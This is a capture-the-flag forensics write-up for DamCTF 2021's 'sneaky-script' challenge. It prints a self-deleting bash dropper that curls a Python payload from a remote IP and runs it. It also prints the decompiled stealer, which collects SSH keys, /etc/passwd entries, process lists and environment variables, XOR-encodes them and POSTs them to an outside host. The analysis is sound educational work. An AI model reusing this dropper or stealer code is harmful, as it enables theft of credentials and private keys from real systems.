---
# Obsidian
tags:
- ctf
- 2021-damctf
- malware
- forensics
- pcap
- wireshark
- python
- bash
- xor
- base64


# Jekyll
layout: ctf
type: problem

# Problem info
ctf: 2021-damctf
category: malware
title: sneaky-script
points: 333
solved: true
---

# sneaky-script

## Instructions

We recovered a malicious script from a victim environment. Can you figure out what it did, and if any sensitive information was exfiltrated? We were able to export some PCAP data from their environment as well.

[files.zip](#)

## Solution

In the included files.zip we have a shell script and a pcap file. The shell script is as follows:

```bash
#!/bin/bash

rm -f "${BASH_SOURCE[0]}"

which python3 >/dev/null
if [[ $? -ne 0 ]]; then
 exit
fi

which curl >/dev/null
if [[ $? -ne 0 ]]; then
 exit
fi

mac_addr=$(ip addr | grep 'state UP' -A1 | tail -n1 | awk '{print $2}')
curl 54.80.43.46/images/banner.png?cache=$(base64 <<< $mac_addr) -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 2>/dev/null | base64 -d > /tmp/.cacheimg

python3 /tmp/.cacheimg
rm -f /tmp/.cacheimg
```

In wireshark we can filter for the `54.80.43.46` ip address and grab the base64 string in the response to the curl request. Decoding it gives us a byte-compiled python string.

```bash
$ file curl-response 
curl-response: python 3.6 byte-compiled
```

We can decomplie this bytecode back to Python using the python package `uncompyle6`.

```python
# uncompyle6 version 3.8.0
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.9.7 (default, Sep 24 2021, 09:43:00) 
# [GCC 10.3.0]
# Embedded file name: /tmp/tmpaliidej5
# Compiled at: 2021-09-25 17:59:31
# Size of source mod 2**32: 2900 bytes
import array, base64, fcntl, http.client, json, re, socket, struct, os, uuid

def get_net_info():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    g = array.array('B', b'\x00' * 4096)
    y = struct.unpack('iL', fcntl.ioctl(s.fileno(), 35090, struct.pack('iL', 4096, g.buffer_info()[0])))[0]
    n = g.tobytes()
    a = []
    for i in range(0, y, 40):
        c = n[i:i + 16].split(b'\x00', 1)[0]
        c = c.decode()
        m = n[i + 20:i + 24]
        v = f"{m[0]}.{m[1]}.{m[2]}.{m[3]}"
        a.append((c, v))
    return a


def get_users():
    with open('/etc/passwd', 'r') as (f):
        x = [x.strip() for x in f.readlines()]
    g = []
    for z in x:
        a = z.split(':')
        if int(a[2]) < 1000 or int(a[2]) > 65000:
            if a[0] != 'root':
                continue
        g.append((a[2], a[0], a[5], a[6]))
    return g


def get_proc():
    n = []
    a = os.listdir('/proc')
    for b in a:
        try:
            int(b)
            x = os.readlink(f"/proc/{b}/exe")
            with open(f"/proc/{b}/cmdline", 'rb') as (f):
                s = (b' ').join(f.read().split(b'\x00')).decode()
            n.append((b, x, s))
        except:
            continue
    return n


def get_ssh(u):
    s = []
    try:
        x = os.listdir(u + '/.ssh')
        for y in x:
            try:
                with open(f"{u}/.ssh/{y}", 'r') as (f):
                    s.append((y, f.read()))
            except:
                continue
    except:
        pass
    return s


def build_output(net, user, proc, ssh):
    out = {}
    out['net'] = net
    out['proc'] = proc
    out['env'] = dict(os.environ)
    out['user'] = []
    for i in range(len(user)):
        out['user'].append({'info':user[i],  'ssh':ssh[i]})
    return out


def send(data):
    c = http.client.HTTPConnection('34.207.187.90')
    p = json.dumps(data).encode()
    k = b'8675309'
    d = bytes([p[i] ^ k[(i % len(k))] for i in range(len(p))])
    c.request('POST', '/upload', base64.b64encode(d))
    x = c.getresponse()


def a():
    key = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    if '4b:e1:d6:a8:66:be' != key:
        return
    net = get_net_info()
    user = get_users()
    proc = get_proc()
    ssh = []
    for _, _, a, _ in user:
        ssh.append(get_ssh(a))
    data = build_output(net, user, proc, ssh)
    send(data)


try:
    a()
except:
    pass
# okay decompiling curl-response.pyc
```

The `send()` function appears to be exfiltrating xor'ed and base64 encoded data back to a remote host via HTTP. We can grab the exfiltrated data by looking for the POST request from the `34.207.187.90` host in the pcap and decoding the data.

```python
import base64

def main():
    with open("exfil.bin", "r") as f:
        encoded = f.read()
        k = b'8675309'
        data = base64.b64decode(encoded)
        print(bytes([data[i] ^ k[(i % len(k))] for i in range(len(data))]))

if __name__ == "__main__":
    main()
```

Search for the flag format in the resulting data gets us the flag in the environment variables:

```
"FLAG": "dam{oh_n0_a1l_muh_k3y5_are_g0n3}",
```

## Continued On


